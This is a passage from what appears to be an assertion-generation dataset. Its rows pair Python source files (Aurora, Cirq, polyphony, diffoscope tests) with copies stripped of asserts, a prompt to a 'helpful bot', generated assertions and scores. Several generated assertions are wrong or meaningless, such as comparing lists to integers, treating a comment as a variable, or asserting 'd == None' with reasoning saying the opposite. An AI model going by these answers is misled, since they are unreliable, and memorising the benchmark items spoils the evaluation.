1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['IMPORT_RE', 'import_statement', 'matcher', 'class_name', 'group', 'import_statements', 'groups', 'IMPORT_CLASS_RE', 'import_groups', 'x', 'y', 'x_m', 'y_m', 'lines', 'all_lines', 'explicit_groups', 'remaining_groups', 'BEFORE_IMPORTS', 'IMPORTS', 'STATIC_IMPORTS', 'AFTER_IMPORTS', 'argv', 'lines_before_imports', 'import_lines', 'static_import_lines', 'lines_after_imports', 'position', 'line', 'static_import_groups', 'file_lines']
*Code:

1#!/bin/env python
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14#
15
16'''
17Organizes a java source file's import statements in a way that pleases
18Apache Aurora's checkstyle configuration.  This expects exactly one
19argument: the name of the file to modify with preferred import ordering.
20'''
21
22from __future__ import print_function
23
24import re
25import sys
26from collections import defaultdict
27
28IMPORT_RE = re.compile('import(?: static)? (.*);')
29
30
31def get_group(import_statement):
32  matcher = IMPORT_RE.match(import_statement)
33  class_name = matcher.group(1)
34  group = class_name.split('.')[0]
35  return group
36
37
38def index_by_group(import_statements):
39  groups = defaultdict(list)
40  for line in import_statements:
41    groups[get_group(line)].append(line)
42  return groups
43
44
45IMPORT_CLASS_RE = re.compile(
46    r'import(?: static)? (?P<outer>[^A-Z]*[A-Z]\w+)(?:\.(?P<inners>[\w][^;]*))?')
47
48
49def get_all_group_lines(import_groups):
50  if not import_groups:
51    return []
52
53  def get_group_lines(group):
54    def comparator(x, y):
55      # These shenanigans are used to properly order imports for inner classes.
56      # So we get ordering like:
57      # import com.foo.Bar;
58      # import com.foo.Bar.Baz;
59      # (this is not lexicographical, so normal sort won't suffice)
60      x_m = IMPORT_CLASS_RE.match(x)
61      y_m = IMPORT_CLASS_RE.match(y)
62      if x_m.group('outer') == y_m.group('outer'):
63        return cmp(x_m.group('inners'), y_m.group('inners'))
64      else:
65        return cmp(x, y)
66    lines = sorted(import_groups[group], comparator)
67    lines.append('')
68    return lines
69
70  all_lines = []
71  explicit_groups = ['java', 'javax', 'scala', 'com', 'net', 'org']
72  for group in explicit_groups:
73    if group in import_groups:
74      all_lines += get_group_lines(group)
75
76  # Gather remaining groups.
77  remaining_groups = sorted(set(import_groups.keys()) - set(explicit_groups))
78  for group in remaining_groups:
79    all_lines += get_group_lines(group)
80  return all_lines
81
82
83BEFORE_IMPORTS = 'before_imports'
84IMPORTS = 'imports'
85STATIC_IMPORTS = 'static_imports'
86AFTER_IMPORTS = 'after_imports'
87
88
89def main(argv):
90  if len(argv) != 2:
91    print('usage: %s FILE' % argv[0])
92    sys.exit(1)
93
94  print('Organizing imports in %s' % argv[1])
95  lines_before_imports = []
96  import_lines = []
97  static_import_lines = []
98  lines_after_imports = []
99  with open(argv[1], 'r') as f:
100    position = BEFORE_IMPORTS
101    for line in f:
102      line = line.rstrip()
103      if position == BEFORE_IMPORTS:
104        if line.startswith('import'):
105          position = IMPORTS
106        else:
107          lines_before_imports.append(line)
108      if position == IMPORTS:
109        if line.startswith('import static'):
110          position = STATIC_IMPORTS
111        elif line.startswith('import'):
112          import_lines.append(line)
113        elif line.strip():
114          position = AFTER_IMPORTS
115      if position == STATIC_IMPORTS:
116        if line.startswith('import static'):
117          static_import_lines.append(line)
118        elif line.strip():
119          position = AFTER_IMPORTS
120      if position == AFTER_IMPORTS:
121        lines_after_imports.append(line)
122
123  import_groups = index_by_group(import_lines)
124  static_import_groups = index_by_group(static_import_lines)
125
126  def ensure_line_padding(lines):
127    if lines and lines[-1] != '':
128      lines.append('')
129    return lines
130
131  file_lines = lines_before_imports
132  if import_groups:
133    ensure_line_padding(file_lines)
134    file_lines += get_all_group_lines(import_groups)
135  if static_import_groups:
136    ensure_line_padding(file_lines)
137    file_lines += get_all_group_lines(static_import_groups)
138  if lines_after_imports:
139    ensure_line_padding(file_lines)
140    file_lines += lines_after_imports
141
142  with open(argv[1], 'w') as f:
143    for line in file_lines:
144      print(line, file=f)
145
146
147if __name__ == '__main__':
148  main(sys.argv)
149",6478,"[[31, 'import_statement', '!=', '', 'import_statement must be a non-empty string'],
[39, 'import_statements', '>=', 1, 'import_statements list should contain at least one element'],
[90, 'argv', '==', 2, 'the program requires the filename as the only argument'],
[102, 'line', '!=', '','file line should not be empty'],
[99, 'argv[1]', '!=', '', 'filename should not be empty'],
[123, 'import_lines', '>=', 1, 'import_lines list should contain at least one element'],
[124, 'static_import_lines', '>=', 1, 'static_import_lines list should contain at least one element'],
[131, 'file_lines', '>=', 1, 'file_lines list should contain at least one element'],
[142, 'line', '!=', '','file line should not be empty']]"
ktok07b6/polyphony,"from polyphony import testbench

class C:
    def __init__(self, x):
        self.x = x

    def get_x(self):
        return self.x

def c_get_x_mul(cc:object):
    return cc.get_x() * cc.get_x()

def param02(x):
    c = C(x)
    return c_get_x_mul(c)

@testbench
def test():
    assert 1 == param02(1)
    assert 4 == param02(2)
    assert 9 == param02(3)

test()
","
1from polyphony import testbench
2
3class C:
4    def __init__(self, x):
5        self.x = x
6
7    def get_x(self):
8        return self.x
9
10def c_get_x_mul(cc:object):
11    return cc.get_x() * cc.get_x()
12
13def param02(x):
14    c = C(x)
15    return c_get_x_mul(c)
16
17@testbench
18def test():
19
20test()
21","[['1', '==', 'param02(1)'], ['4', '==', 'param02(2)'], ['9', '==', 'param02(3)']]",3,3,1.0,0.0082191780821917,"['x', 'self.x', 'cc:object', 'c']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['x', 'self.x', 'cc:object', 'c']
*Code:

1from polyphony import testbench
2
3class C:
4    def __init__(self, x):
5        self.x = x
6
7    def get_x(self):
8        return self.x
9
10def c_get_x_mul(cc:object):
11    return cc.get_x() * cc.get_x()
12
13def param02(x):
14    c = C(x)
15    return c_get_x_mul(c)
16
17@testbench
18def test():
19
20test()
21",1731,"[[4, 'x', '!=', None, 'x should not be None'], 
 [10, 'cc', '!=', None, 'object cc should not be None'],
 [10, 'cc.get_x()', '!=', None, 'get_x method should return not None'],
 [14, 'x', '!=', None, 'x should not be None']]"
quantumlib/Cirq,"# Copyright 2022 The Cirq Developers
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import cirq
import cirq_ionq as ionq
import pytest
import sympy

VALID_GATES = (
    cirq.X,
    cirq.Y,
    cirq.Z,
    cirq.X**0.5,
    cirq.Y**0.5,
    cirq.Z**0.5,
    cirq.rx(0.1),
    cirq.ry(0.1),
    cirq.rz(0.1),
    cirq.H,
    cirq.HPowGate(exponent=1, global_shift=-0.5),
    cirq.T,
    cirq.S,
    cirq.CNOT,
    cirq.CXPowGate(exponent=1, global_shift=-0.5),
    cirq.XX,
    cirq.YY,
    cirq.ZZ,
    cirq.XX**0.5,
    cirq.YY**0.5,
    cirq.ZZ**0.5,
    cirq.SWAP,
    cirq.SwapPowGate(exponent=1, global_shift=-0.5),
    cirq.MeasurementGate(num_qubits=1, key='a'),
    cirq.MeasurementGate(num_qubits=2, key='b'),
    cirq.MeasurementGate(num_qubits=10, key='c'),
)

ionq_target_gateset = ionq.IonQTargetGateset()


@pytest.mark.parametrize('g', [ionq.IonQTargetGateset(), ionq.IonQTargetGateset(atol=1e-5)])
def test_gateset_repr(g):
    cirq.testing.assert_equivalent_repr(g, setup_code='import cirq_ionq\n')


@pytest.mark.parametrize('gate', VALID_GATES)
def test_decompose_leaves_supported_alone(gate):
    qubits = cirq.LineQubit.range(gate.num_qubits())
    operation = gate(*qubits)
    assert gate in ionq_target_gateset
    assert operation in ionq_target_gateset
    circuit = cirq.Circuit(operation)
    decomposed_circuit = cirq.optimize_for_target_gateset(
        circuit, gateset=ionq_target_gateset, ignore_failures=False
    )
    assert decomposed_circuit == circuit


VALID_DECOMPOSED_GATES = cirq.Gateset(cirq.XPowGate, cirq.YPowGate, cirq.ZPowGate, cirq.CNOT)


def test_decompose_single_qubit_matrix_gate():
    q = cirq.LineQubit(0)
    for _ in range(10):
        gate = cirq.MatrixGate(cirq.testing.random_unitary(2))
        circuit = cirq.Circuit(gate(q))
        decomposed_circuit = cirq.optimize_for_target_gateset(
            circuit, gateset=ionq_target_gateset, ignore_failures=False
        )
        cirq.testing.assert_circuits_with_terminal_measurements_are_equivalent(
            circuit, decomposed_circuit, atol=1e-8
        )
        assert VALID_DECOMPOSED_GATES.validate(decomposed_circuit)


def test_decompose_two_qubit_matrix_gate():
    q0, q1 = cirq.LineQubit.range(2)
    for _ in range(10):
        gate = cirq.MatrixGate(cirq.testing.random_unitary(4))
        circuit = cirq.Circuit(gate(q0, q1))
        decomposed_circuit = cirq.optimize_for_target_gateset(
            circuit, gateset=ionq_target_gateset, ignore_failures=False
        )
        cirq.testing.assert_circuits_with_terminal_measurements_are_equivalent(
            circuit, decomposed_circuit, atol=1e-8
        )
        assert VALID_DECOMPOSED_GATES.validate(decomposed_circuit)


@pytest.mark.parametrize(
    'gate, qubits',
    [
        (cirq.CCZ, 3),
        (cirq.QuantumFourierTransformGate(6), 6),
        (cirq.MatrixGate(cirq.testing.random_unitary(8)), 3),
    ],
)
def test_decompose_multi_qubit_cirq_gates(gate, qubits):
    circuit = cirq.Circuit(gate(*cirq.LineQubit.range(qubits)))
    decomposed_circuit = cirq.optimize_for_target_gateset(
        circuit, gateset=ionq_target_gateset, ignore_failures=False
    )
    cirq.testing.assert_circuits_with_terminal_measurements_are_equivalent(
        circuit, decomposed_circuit, atol=1e-8
    )
    assert ionq_target_gateset.validate(decomposed_circuit)


def test_decompose_parameterized_operation():
    op = cirq.ISWAP(*cirq.LineQubit.range(2))
    theta = sympy.Symbol(""theta"")
    circuit = cirq.Circuit(op**theta)
    decomposed_circuit = cirq.optimize_for_target_gateset(
        circuit, gateset=ionq_target_gateset, ignore_failures=False
    )
    for theta_val in [-0.25, 1.0, 0.5]:
        cirq.testing.assert_circuits_with_terminal_measurements_are_equivalent(
            cirq.resolve_parameters(circuit, {theta: theta_val}),
            cirq.resolve_parameters(decomposed_circuit, {theta: theta_val}),
            atol=1e-6,
        )
    assert ionq_target_gateset.validate(decomposed_circuit)
","
1# Copyright 2022 The Cirq Developers
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     https://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14
15import cirq
16import cirq_ionq as ionq
17import pytest
18import sympy
19
20VALID_GATES = (
21    cirq.X,
22    cirq.Y,
23    cirq.Z,
24    cirq.X**0.5,
25    cirq.Y**0.5,
26    cirq.Z**0.5,
27    cirq.rx(0.1),
28    cirq.ry(0.1),
29    cirq.rz(0.1),
30    cirq.H,
31    cirq.HPowGate(exponent=1, global_shift=-0.5),
32    cirq.T,
33    cirq.S,
34    cirq.CNOT,
35    cirq.CXPowGate(exponent=1, global_shift=-0.5),
36    cirq.XX,
37    cirq.YY,
38    cirq.ZZ,
39    cirq.XX**0.5,
40    cirq.YY**0.5,
41    cirq.ZZ**0.5,
42    cirq.SWAP,
43    cirq.SwapPowGate(exponent=1, global_shift=-0.5),
44    cirq.MeasurementGate(num_qubits=1, key='a'),
45    cirq.MeasurementGate(num_qubits=2, key='b'),
46    cirq.MeasurementGate(num_qubits=10, key='c'),
47)
48
49ionq_target_gateset = ionq.IonQTargetGateset()
50
51
52@pytest.mark.parametrize('g', [ionq.IonQTargetGateset(), ionq.IonQTargetGateset(atol=1e-5)])
53def test_gateset_repr(g):
54
55
56@pytest.mark.parametrize('gate', VALID_GATES)
57def test_decompose_leaves_supported_alone(gate):
58    qubits = cirq.LineQubit.range(gate.num_qubits())
59    operation = gate(*qubits)
60    circuit = cirq.Circuit(operation)
61    decomposed_circuit = cirq.optimize_for_target_gateset(
62        circuit, gateset=ionq_target_gateset, ignore_failures=False
63    )
64
65
66VALID_DECOMPOSED_GATES = cirq.Gateset(cirq.XPowGate, cirq.YPowGate, cirq.ZPowGate, cirq.CNOT)
67
68
69def test_decompose_single_qubit_matrix_gate():
70    q = cirq.LineQubit(0)
71    for _ in range(10):
72        gate = cirq.MatrixGate(cirq.testing.random_unitary(2))
73        circuit = cirq.Circuit(gate(q))
74        decomposed_circuit = cirq.optimize_for_target_gateset(
75            circuit, gateset=ionq_target_gateset, ignore_failures=False
76        )
77            circuit, decomposed_circuit, atol=1e-8
78        )
79
80
81def test_decompose_two_qubit_matrix_gate():
82    q0, q1 = cirq.LineQubit.range(2)
83    for _ in range(10):
84        gate = cirq.MatrixGate(cirq.testing.random_unitary(4))
85        circuit = cirq.Circuit(gate(q0, q1))
86        decomposed_circuit = cirq.optimize_for_target_gateset(
87            circuit, gateset=ionq_target_gateset, ignore_failures=False
88        )
89            circuit, decomposed_circuit, atol=1e-8
90        )
91
92
93@pytest.mark.parametrize(
94    'gate, qubits',
95    [
96        (cirq.CCZ, 3),
97        (cirq.QuantumFourierTransformGate(6), 6),
98        (cirq.MatrixGate(cirq.testing.random_unitary(8)), 3),
99    ],
100)
101def test_decompose_multi_qubit_cirq_gates(gate, qubits):
102    circuit = cirq.Circuit(gate(*cirq.LineQubit.range(qubits)))
103    decomposed_circuit = cirq.optimize_for_target_gateset(
104        circuit, gateset=ionq_target_gateset, ignore_failures=False
105    )
106        circuit, decomposed_circuit, atol=1e-8
107    )
108
109
110def test_decompose_parameterized_operation():
111    op = cirq.ISWAP(*cirq.LineQubit.range(2))
112    theta = sympy.Symbol(""theta"")
113    circuit = cirq.Circuit(op**theta)
114    decomposed_circuit = cirq.optimize_for_target_gateset(
115        circuit, gateset=ionq_target_gateset, ignore_failures=False
116    )
117    for theta_val in [-0.25, 1.0, 0.5]:
118            cirq.resolve_parameters(circuit, {theta: theta_val}),
119            cirq.resolve_parameters(decomposed_circuit, {theta: theta_val}),
120            atol=1e-6,
121        )
122","[['decomposed_circuit', '==', 'circuit'], ['VALID_DECOMPOSED_GATES.validate(decomposed_circuit)', '==', 'True'], ['VALID_DECOMPOSED_GATES.validate(decomposed_circuit)', '==', 'True'], ['ionq_target_gateset.validate(decomposed_circuit)', '==', 'True'], ['ionq_target_gateset.validate(decomposed_circuit)', '==', 'True']]",12,5,0.4166666666666667,0.0011098779134295,"['VALID_GATES', 'ionq_target_gateset', 'g', 'gate', 'qubits', 'operation', 'circuit', 'decomposed_circuit', 'VALID_DECOMPOSED_GATES', 'q', 'q0', 'q1', 'op', 'theta']",14,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['VALID_GATES', 'ionq_target_gateset', 'g', 'gate', 'qubits', 'operation', 'circuit', 'decomposed_circuit', 'VALID_DECOMPOSED_GATES', 'q', 'q0', 'q1', 'op', 'theta']
*Code:

1# Copyright 2022 The Cirq Developers
2#
3# Licensed under the Apache License, Version 2.0 (the ""License"");
4# you may not use this file except in compliance with the License.
5# You may obtain a copy of the License at
6#
7#     https://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software
10# distributed under the License is distributed on an ""AS IS"" BASIS,
11# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
12# See the License for the specific language governing permissions and
13# limitations under the License.
14
15import cirq
16import cirq_ionq as ionq
17import pytest
18import sympy
19
20VALID_GATES = (
21    cirq.X,
22    cirq.Y,
23    cirq.Z,
24    cirq.X**0.5,
25    cirq.Y**0.5,
26    cirq.Z**0.5,
27    cirq.rx(0.1),
28    cirq.ry(0.1),
29    cirq.rz(0.1),
30    cirq.H,
31    cirq.HPowGate(exponent=1, global_shift=-0.5),
32    cirq.T,
33    cirq.S,
34    cirq.CNOT,
35    cirq.CXPowGate(exponent=1, global_shift=-0.5),
36    cirq.XX,
37    cirq.YY,
38    cirq.ZZ,
39    cirq.XX**0.5,
40    cirq.YY**0.5,
41    cirq.ZZ**0.5,
42    cirq.SWAP,
43    cirq.SwapPowGate(exponent=1, global_shift=-0.5),
44    cirq.MeasurementGate(num_qubits=1, key='a'),
45    cirq.MeasurementGate(num_qubits=2, key='b'),
46    cirq.MeasurementGate(num_qubits=10, key='c'),
47)
48
49ionq_target_gateset = ionq.IonQTargetGateset()
50
51
52@pytest.mark.parametrize('g', [ionq.IonQTargetGateset(), ionq.IonQTargetGateset(atol=1e-5)])
53def test_gateset_repr(g):
54
55
56@pytest.mark.parametrize('gate', VALID_GATES)
57def test_decompose_leaves_supported_alone(gate):
58    qubits = cirq.LineQubit.range(gate.num_qubits())
59    operation = gate(*qubits)
60    circuit = cirq.Circuit(operation)
61    decomposed_circuit = cirq.optimize_for_target_gateset(
62        circuit, gateset=ionq_target_gateset, ignore_failures=False
63    )
64
65
66VALID_DECOMPOSED_GATES = cirq.Gateset(cirq.XPowGate, cirq.YPowGate, cirq.ZPowGate, cirq.CNOT)
67
68
69def test_decompose_single_qubit_matrix_gate():
70    q = cirq.LineQubit(0)
71    for _ in range(10):
72        gate = cirq.MatrixGate(cirq.testing.random_unitary(2))
73        circuit = cirq.Circuit(gate(q))
74        decomposed_circuit = cirq.optimize_for_target_gateset(
75            circuit, gateset=ionq_target_gateset, ignore_failures=False
76        )
77            circuit, decomposed_circuit, atol=1e-8
78        )
79
80
81def test_decompose_two_qubit_matrix_gate():
82    q0, q1 = cirq.LineQubit.range(2)
83    for _ in range(10):
84        gate = cirq.MatrixGate(cirq.testing.random_unitary(4))
85        circuit = cirq.Circuit(gate(q0, q1))
86        decomposed_circuit = cirq.optimize_for_target_gateset(
87            circuit, gateset=ionq_target_gateset, ignore_failures=False
88        )
89            circuit, decomposed_circuit, atol=1e-8
90        )
91
92
93@pytest.mark.parametrize(
94    'gate, qubits',
95    [
96        (cirq.CCZ, 3),
97        (cirq.QuantumFourierTransformGate(6), 6),
98        (cirq.MatrixGate(cirq.testing.random_unitary(8)), 3),
99    ],
100)
101def test_decompose_multi_qubit_cirq_gates(gate, qubits):
102    circuit = cirq.Circuit(gate(*cirq.LineQubit.range(qubits)))
103    decomposed_circuit = cirq.optimize_for_target_gateset(
104        circuit, gateset=ionq_target_gateset, ignore_failures=False
105    )
106        circuit, decomposed_circuit, atol=1e-8
107    )
108
109
110def test_decompose_parameterized_operation():
111    op = cirq.ISWAP(*cirq.LineQubit.range(2))
112    theta = sympy.Symbol(""theta"")
113    circuit = cirq.Circuit(op**theta)
114    decomposed_circuit = cirq.optimize_for_target_gateset(
115        circuit, gateset=ionq_target_gateset, ignore_failures=False
116    )
117    for theta_val in [-0.25, 1.0, 0.5]:
118            cirq.resolve_parameters(circuit, {theta: theta_val}),
119            cirq.resolve_parameters(decomposed_circuit, {theta: theta_val}),
120            atol=1e-6,
121        )
122",5539,"[[56, 'gate', '!=', None, ""the gate shouldn't be None""],
 [57, 'qubits', '!=', None, ""qubits shouldn't be None""],
 [59, 'operation', '!=', None, ""operation should be initialized properly""],
 [60, 'circuit', '!=', None, ""circuit should be initialized properly""],
 [62, 'decomposed_circuit', '!=', None, ""decomposed_circuit should be initialized properly""],
 [70, 'q', '!=', None, ""q shouldn't be None""],
 [82, 'q0', '!=', None, ""q0 shouldn't be None""],
 [82, 'q1', '!=', None, ""q0 shouldn't be None""],
 [102, 'circuit', '!=', None, ""circuit should be initialized properly""],
 [103, 'decomposed_circuit', '!=', None, ""decomposed_circuit should be initialized properly""],
 [110, 'op', '!=', None, ""op shouldn't be None""],
 [112, 'circuit', '!=', None, ""circuit should be initialized properly""],
 [113, 'decomposed_circuit', '!=', None, ""decomposed_circuit should be initialized properly""]]"
igemsoftware/SYSU-Software-2015,"# -*- coding: utf-8 -*-

from . import TestCase

from server.models import Device, ComponentPrototype, ComponentInstance, \
        Relationship, Design
from server import db

class TestFunction(TestCase):

#   def test_component(self):
#       c = ComponentInstance('Promotor')
#       assert c.partID == 'Promotor'

#       c = ComponentInstance(100)
#       assert c.partID == 'None'

    def test_relationship(self):
        pro = ComponentPrototype.query.get(2)
        rbs = ComponentPrototype.query.get(3)

        r = Relationship(start=pro, end=rbs, type='Normal') 
        db.session.add(r)
        db.session.commit()

        assert pro.point_to.all() != []
        assert pro.be_point.all() == []
        assert rbs.point_to.all() == []
        assert rbs.be_point.all() != []

    
    def test_Device(self):
        d = Device(title='test')
        d.commit_to_db() # use this method to commit

        assert d.parts == [] 
        assert d.relationship == [] 

        c1 = d.add_component_by_id(2)
        assert len(d.parts) == 1
        assert d.parts[0].positionX == 300.0

        c2 = d.add_component_by_id(2, partID='Promotor 2', positionX=0.3)
        d.add_connection(c1.partID, c2.partID, 'Promote')

        d.commit_to_db() # use this method to commit
        d.update_from_db() # use this method to get

        assert d.parts[1].positionX == 0.3
        assert d.parts[0].partID == 'Promotor'
        assert d.parts[1].partID == 'Promotor 2'
        assert d.relationship[0]['start'] == c1.partID
        assert d.relationship[0]['end'] == c2.partID
        assert d.relationship[0]['type'] == 'Promote'




","
1# -*- coding: utf-8 -*-
2
3from . import TestCase
4
5from server.models import Device, ComponentPrototype, ComponentInstance, \
6        Relationship, Design
7from server import db
8
9class TestFunction(TestCase):
10
11#   def test_component(self):
12#       c = ComponentInstance('Promotor')
13
14#       c = ComponentInstance(100)
15
16    def test_relationship(self):
17        pro = ComponentPrototype.query.get(2)
18        rbs = ComponentPrototype.query.get(3)
19
20        r = Relationship(start=pro, end=rbs, type='Normal') 
21        db.session.add(r)
22        db.session.commit()
23
24
25    
26    def test_Device(self):
27        d = Device(title='test')
28        d.commit_to_db() # use this method to commit
29
30
31        c1 = d.add_component_by_id(2)
32
33        c2 = d.add_component_by_id(2, partID='Promotor 2', positionX=0.3)
34        d.add_connection(c1.partID, c2.partID, 'Promote')
35
36        d.commit_to_db() # use this method to commit
37        d.update_from_db() # use this method to get
38
39
40
41
42
43","[['pro.point_to.all()', '!=', '[]'], ['pro.be_point.all()', '==', '[]'], ['rbs.point_to.all()', '==', '[]'], ['rbs.be_point.all()', '!=', '[]'], ['d.parts', '==', '[]'], ['d.relationship', '==', '[]'], ['len(d.parts)', '==', '1'], ['d.parts[0].positionX', '==', '300.0'], ['d.parts[1].positionX', '==', '0.3'], ['d.parts[0].partID', '==', ""'Promotor'""], ['d.parts[1].partID', '==', ""'Promotor 2'""], [""d.relationship[0]['start']"", '==', 'c1.partID'], [""d.relationship[0]['end']"", '==', 'c2.partID'], [""d.relationship[0]['type']"", '==', ""'Promote'""]]",16,14,0.875,0.0085417937766931,"['#       c', 'pro', 'rbs', 'r', 'd', 'c1', 'c2']",7,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['#       c', 'pro', 'rbs', 'r', 'd', 'c1', 'c2']
*Code:

1# -*- coding: utf-8 -*-
2
3from . import TestCase
4
5from server.models import Device, ComponentPrototype, ComponentInstance, \
6        Relationship, Design
7from server import db
8
9class TestFunction(TestCase):
10
11#   def test_component(self):
12#       c = ComponentInstance('Promotor')
13
14#       c = ComponentInstance(100)
15
16    def test_relationship(self):
17        pro = ComponentPrototype.query.get(2)
18        rbs = ComponentPrototype.query.get(3)
19
20        r = Relationship(start=pro, end=rbs, type='Normal') 
21        db.session.add(r)
22        db.session.commit()
23
24
25    
26    def test_Device(self):
27        d = Device(title='test')
28        d.commit_to_db() # use this method to commit
29
30
31        c1 = d.add_component_by_id(2)
32
33        c2 = d.add_component_by_id(2, partID='Promotor 2', positionX=0.3)
34        d.add_connection(c1.partID, c2.partID, 'Promote')
35
36        d.commit_to_db() # use this method to commit
37        d.update_from_db() # use this method to get
38
39
40
41
42
43",2468,"[[11, '#       c', '!=', None, ""ComponentInstance should not be None""],
 [11, '#       c', '==', 'pro', 'Both variables should contain ComponentInstances'],
 [16, 'pro', '!=', None, ""ComponentPrototype should not be None""],
 [16, 'rbs', '!=', None, ""ComponentPrototype should not be None""],
 [20, 'r', '!=', None, ""Relationship instance should not be None""],
 [26, 'd', '!=', None, ""Device instance should not be None""],
 [31, 'c1', '!=', None, ""First ComponentInstance from Device should not be None""],
 [33, 'c2', '!=', None, ""Second ComponentInstance from Device should not be None""],
 [34, 'd', '==', None, ""Device instance should not change""]]"
anthraxx/diffoscope,"# -*- coding: utf-8 -*-
#
# diffoscope: in-depth comparison of files, archives, and directories
#
# Copyright © 2015 Jérémy Bobbio <lunar@debian.org>
#
# diffoscope is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# diffoscope is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with diffoscope.  If not, see <https://www.gnu.org/licenses/>.

import shutil
import pytest

from diffoscope.comparators.xz import XzFile
from diffoscope.comparators.binary import FilesystemFile
from diffoscope.comparators.utils.specialize import specialize

from utils.data import load_fixture, get_data
from utils.tools import skip_unless_tools_exist
from utils.nonexisting import assert_non_existing

xz1 = load_fixture('test1.xz')
xz2 = load_fixture('test2.xz')

def test_identification(xz1):
    assert isinstance(xz1, XzFile)

def test_no_differences(xz1):
    difference = xz1.compare(xz1)
    assert difference is None

@pytest.fixture
def differences(xz1, xz2):
    return xz1.compare(xz2).details

@skip_unless_tools_exist('xz')
def test_content_source(differences):
    assert differences[0].source1 == 'test1'
    assert differences[0].source2 == 'test2'

@skip_unless_tools_exist('xz')
def test_content_source_without_extension(tmpdir, xz1, xz2):
    path1 = str(tmpdir.join('test1'))
    path2 = str(tmpdir.join('test2'))
    shutil.copy(xz1.path, path1)
    shutil.copy(xz2.path, path2)
    xz1 = specialize(FilesystemFile(path1))
    xz2 = specialize(FilesystemFile(path2))
    difference = xz1.compare(xz2).details
    assert difference[0].source1 == 'test1-content'
    assert difference[0].source2 == 'test2-content'

@skip_unless_tools_exist('xz')
def test_content_diff(differences):
